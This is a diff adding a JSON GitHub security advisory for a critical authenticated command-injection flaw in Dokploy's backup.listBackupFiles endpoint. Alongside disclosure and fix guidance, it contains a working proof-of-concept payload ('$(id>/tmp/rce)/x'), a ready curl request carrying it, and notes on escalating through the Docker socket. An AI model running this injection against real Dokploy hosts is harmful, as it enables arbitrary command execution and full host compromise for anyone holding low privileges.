@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-5vjv-73wr-rf79",
+  "repo": {
+    "cve_id": "CVE-2026-72738",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.9,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "## Summary\r\n\r\nThe `backup.listBackupFiles` tRPC endpoint accepts a `search` parameter that is interpolated unsanitized into a shell command executed via `child_process.exec()`. An authenticated user with `backup:read` permission can inject shell metacharacters to achieve remote code execution on the host OS. No running database container is required to exploit this vulnerability.\r\n\r\n## Details\r\n\r\nThe `search` parameter is processed by `normalizeS3Path()`, which only normalizes slash characters and leaves shell metacharacters (`$`, `(`, `)`, `` ` ``, `;`) intact. The resulting value is embedded inside a double-quoted shell command argument and passed to `execAsync()`:\r\n\r\n```typescript\r\n// apps/dokploy/server/api/routers/backup.ts\r\nconst searchPath = baseDir ? `${bucketPath}/${baseDir}` : bucketPath;\r\nconst listCommand = `rclone lsjson ${rcloneFlags.join(\" \")} \"${searchPath}\" --no-mimetype --no-modtime 2>/dev/null`;\r\nawait execAsync(listCommand);  // /bin/sh -c\r\n```\r\n\r\nPOSIX shells expand `$(...)` inside double-quoted strings as a pre-execution step. When `search` is `$(cmd)/x`, the shell executes `cmd` on the host before invoking rclone. The injection fires regardless of whether rclone is installed or the S3 endpoint is reachable.\r\n\r\nThe codebase contains an existing `isValidSearch()` validation function in `apps/dokploy/server/wss/utils.ts` that explicitly documents injection prevention, but it was not applied to this endpoint.\r\n\r\n## Proof of Concept\r\n\r\n**Prerequisites:**\r\n- Valid Dokploy account (any role with `backup:read` permission)\r\n- At least one S3 Destination record in the organization (fake credentials are sufficient)\r\n\r\n**Web Interface Flow:**\r\n\r\n1. Navigate to **Settings → S3 Destinations → Add Destination** and create a destination with any values (fake credentials are sufficient)\r\n2. Navigate to **Projects → Create Project**\r\n3. Inside the project, create a service (e.g. **PostgreSQL**)\r\n4. Open the service → **Backups** tab → create a backup referencing the destination created in step 1\r\n5. Click the **Restore Backup** button - a restore dialog opens with three fields: **Destination**, **Search Backup Files**, and **Database Name**\r\n6. Select the destination from the **Destination** dropdown - the **Search Backup Files** field becomes active only after a destination is selected\r\n7. Type the payload into the now-active **Search Backup Files** field:\r\n   ```\r\n   $(id>/tmp/rce)/x\r\n   ```\r\n   Each keystroke (debounced) triggers `listBackupFiles` with the typed value as the `search` parameter\r\n\r\n**Equivalent Direct Request:**\r\n\r\n```bash\r\ncurl -s -G \"http://<dokploy-host>/api/trpc/backup.listBackupFiles\" \\\r\n  --data-urlencode 'batch=1' \\\r\n  --data-urlencode 'input={\"0\":{\"json\":{\"destinationId\":\"<destination_id>\",\"search\":\"$(id>/tmp/rce)/x\",\"serverId\":\"\"}}}' \\\r\n  -H \"Cookie: better-auth.session_token=<valid_session>\"\r\n```\r\n\r\n**Verification:**\r\n\r\n```bash\r\ncat /tmp/rce\r\n# uid=1000(user) gid=1000(user) groups=1000(user),4(adm),27(sudo),1001(docker)\r\n```\r\n\r\nThe output confirms execution on the **host OS** (not inside a container), under the same user account running the Dokploy process. The presence of the `docker` group enables further escalation via the Docker socket.\r\n\r\n## Impact\r\n\r\nAny authenticated user with `backup:read` permission can execute arbitrary commands on the host OS running Dokploy. Since the Dokploy process runs with Docker group membership, an attacker can leverage the Docker socket to escape containers and achieve complete host compromise, including access to all secrets, environment variables, and credentials managed by Dokploy.\r\n\r\n## Recommended Fix\r\n\r\n**Option A - Input validation (immediate mitigation / highly recommended)**\r\n\r\nApply the existing `isValidSearch()` pattern to the `search` parameter to reject shell metacharacters entirely at the tRPC boundary:\r\n\r\n```typescript\r\nsearch: z.string().regex(/^[a-zA-Z0-9 ._\\-\\/]{0,500}$/, \"Invalid search term\")\r\n```\r\n\r\n**Option B - Avoid shell evaluation and escape inputs (preferred architecture)**\r\n\r\nFor local execution, replace `execAsync()` with `spawnAsync()` (using array arguments) to bypass shell interpretation:\r\n\r\n```typescript\r\nawait spawnAsync(\"rclone\", [\"lsjson\", ...rcloneArgs, searchPath]);\r\n```\r\n\r\nCrucially, since this endpoint also supports remote execution via SSH (`execAsyncRemote`), which inherently evaluates strings in a remote shell, the `searchPath` must be strictly escaped using a proper shell escape utility before interpolation. The existing `shEscape()` function in `packages/server/src/services/registry.ts` implements this correctly (single-quote wrapping with inner-quote escaping), but is currently unexported. It should be moved to a shared utility module and applied here:\r\n\r\n```typescript\r\nconst listCommand = `rclone lsjson ${rcloneFlags.join(\" \")} ${shEscape(searchPath)} --no-mimetype --no-modtime 2>/dev/null`;\r\n```\r\n",
+    "ghsa_id": "GHSA-5vjv-73wr-rf79",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-5vjv-73wr-rf79",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-5vjv-73wr-rf79"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-72738"
+      }
+    ],
+    "published_at": "2026-07-21T23:25:12Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Authenticated RCE via Command Injection in backup.listBackupFiles search Parameter",
+    "updated_at": "2026-08-10T17:48:25Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "dokploy"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "<= 0.29.8"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
